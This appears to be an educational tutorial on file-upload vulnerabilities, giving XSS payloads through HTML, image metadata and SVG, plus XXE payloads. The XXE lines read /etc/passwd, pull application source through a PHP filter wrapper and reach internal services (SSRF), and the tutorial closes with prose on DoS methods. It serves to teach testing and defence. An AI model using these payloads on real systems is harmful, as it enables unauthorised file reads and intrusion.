Even when a web application restricts uploads to specific file types (e.g. images or documents), it may still be vulnerable.

This happens because validation usually checks if the file **looks valid**, but not how it will be **processed or rendered later**.

As a result:

> Allowed file types can still introduce vulnerabilities depending on how the application handles them.

---

## XSS via File Upload

Cross-Site Scripting (XSS) can occur when uploaded files are later **rendered in a browser** without proper sanitization.

If the application allows uploading files that can contain HTML or JavaScript, an attacker can inject a payload that executes when another user views the file.

### HTML Files

If `.html` uploads are allowed, the attack is straightforward:

```html
<script>alert(document.domain)</script>
```

The browser will directly interpret this file, and the script will execute when accessed. This leads to **Stored XSS**, since the payload is saved on the server.

### Image Metadata

Some applications extract and display image metadata (e.g. comments, author).

If this data is not sanitized, it can be used for XSS:

```bash
exiftool -Comment='"><img src=1 onerror=alert(1)>' image.jpg
```

Here, the payload is stored inside the image. When the application displays the metadata in HTML, the browser interprets it and executes the JavaScript.

### SVG Files

SVG images are actually **XML documents rendered by the browser**, not just static images.

This means they can contain JavaScript:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

When the SVG is viewed, the browser parses it and executes the script. This makes SVG a common vector for XSS even when only “images” are allowed.

---

## XXE via File Upload

If the application processes XML-based files (such as SVG), it may be vulnerable to **XML External Entity (XXE)** attacks.

XXE allows an attacker to make the server read local files or perform internal requests.


### Basic File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

When the server parses this XML, it resolves the entity and includes the content of `/etc/passwd`. If the output is reflected, the attacker can read it.


### Reading Application Source Code

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

This uses a PHP wrapper to encode the file, allowing the attacker to retrieve the source code safely.

Access to source code is very valuable because it may reveal:

- Upload directories
    
- Validation logic
    
- Additional vulnerabilities
    

### SSRF via XXE

XXE can also be used to make the server send requests:

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080">
```

This allows interaction with internal services that are not externally accessible.

---

## DoS via File Upload

Even without code execution, file uploads can be abused to cause Denial of Service.

### ZIP Bomb

A compressed file can be crafted to expand into a massive size when extracted.

If the application automatically unzips files, this can:

- Fill disk space
    
- Exhaust memory
    
- Crash the server
    


### Image Pixel Flood

Image headers can be manipulated to declare extremely large dimensions.

Although the actual file is small, the server will try to allocate memory based on the declared size, leading to a crash.


### Large File Upload

If there is no file size restriction, uploading very large files can:

- Consume storage
    
- Slow down the system
    
- Affect availability
    


